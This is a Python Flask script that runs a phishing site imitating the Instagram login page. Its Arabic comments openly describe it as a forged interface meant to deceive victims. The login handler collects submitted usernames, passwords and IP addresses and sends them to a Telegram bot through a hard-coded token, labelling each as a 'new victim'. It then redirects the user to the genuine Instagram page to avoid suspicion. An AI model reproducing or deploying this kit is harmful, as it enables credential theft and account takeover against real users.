# instgrm.com
# -*- coding: utf-8 -*-  
import requests  
import sqlite3  
from flask import Flask, request, redirect, render_template_string  
from threading import Thread  
from cryptography.fernet import Fernet  

app = Flask(__name__)  
app.secret_key = "INSTA_DEATH_CODE"  

# تدمير شامل للمعلومات  
API_KEY = "7641235883:AAGkJG7PbgZ3UXwmr6L3fR930xxSo"  
CHAT_ID = "-1792947905"  
TG_URL = f"https://api.telegram.org/bot{API_KEY}/sendMessage"  

# تشفير وهمي لخداع الضحايا  
KEY = Fernet.generate_key()  
cipher = Fernet(KEY)  

# واجهة انستقرام المزورة (مطابقة 100%)  
PHISH_PAGE = """  
<!DOCTYPE html>  
<html dir="rtl">  
<head>  
    <title>Instagram</title>  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <style>  
        :root { --ig-blue: #0095f6; }  
        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial; }  
        .container { max-width: 350px; margin: 60px auto; }  
        .logo { width: 175px; margin: 0 auto 30px; display: block; }  
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }  
        button { background: var(--ig-blue); width: 100%; padding: 12px; border: none; border-radius: 8px; color: white; }  
        .footer { text-align: center; margin-top: 20px; color: #8e8e8e; }  
    </style>  
</head>  
<body>  
    <div class="container">  
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">  
        <form method="POST" action="/login">  
            <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" name="username" required>  
            <input type="password" placeholder="كلمة المرور" name="password" required>  
            <button type="submit">تسجيل الدخول</button>  
        </form>  
        <div class="footer">  
            <a href="#" style="color: var(--ig-blue); text-decoration: none;">هل نسيت كلمة المرور؟</a>  
        </div>  
    </div>  
</body>  
</html>  
"""  

def send_to_telegram(user, passw, ip):  
    try:  
        msg = f"🎯 ضحية جديدة!\nيوزر: {user}\nباسورد: {passw}\nIP: {ip}"  
        requests.post(TG_URL, json={"chat_id": CHAT_ID, "text": msg}, timeout=3)  
    except:  
        pass  

@app.route('/login', methods=['POST'])  
def hell_gate():  
    user = request.form.get('username')  
    passw = request.form.get('password')  
    ip = request.remote_addr  
    Thread(target=send_to_telegram, args=(user, passw, ip)).start()  
    return redirect("https://www.instagram.com/accounts/login/?hl=ar")  

@app.route('/')  
def fake_ig():  
    return render_template_string(PHISH_PAGE)  

if __name__ == "__main__":  
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')  
